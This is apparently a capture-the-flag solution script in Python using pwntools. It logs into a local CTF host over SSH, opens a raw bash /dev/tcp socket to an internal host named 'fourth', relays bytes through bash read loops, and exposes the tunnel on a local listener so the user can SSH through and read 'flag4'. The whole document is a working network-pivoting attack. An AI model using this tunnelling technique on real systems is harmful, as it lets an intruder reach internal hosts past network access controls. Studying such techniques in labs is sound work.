from pwn import *

context.log_level = 'debug'

p = process(['ssh', 'ctf@localhost', '-p2223'])
print(p.recvline()) # Pseudo-terminal will not ...

p.send(b"exec 3<>/dev/tcp/fourth/22\n")

p.send(b"""while true; do IFS='' read -d '' -n 1 -r u; if [ "${#u}" -eq 0 ]; then echo -en "\\x00"; fi; echo -n "$u"; done <&3 &\n""")
p.send(b"""while true; do IFS='' read -d '' -n 1 -r u; if [ "${#u}" -eq 0 ]; then echo -en "\\x00"; fi; echo -n "$u"; done >&3\n""")

l = listen(2224)
print("ssh ctf@localhost -p 2224")
print("Then: `while read line; do echo $line; done < flag4`")
svr = l.wait_for_connection()
svr.connect_both(p)

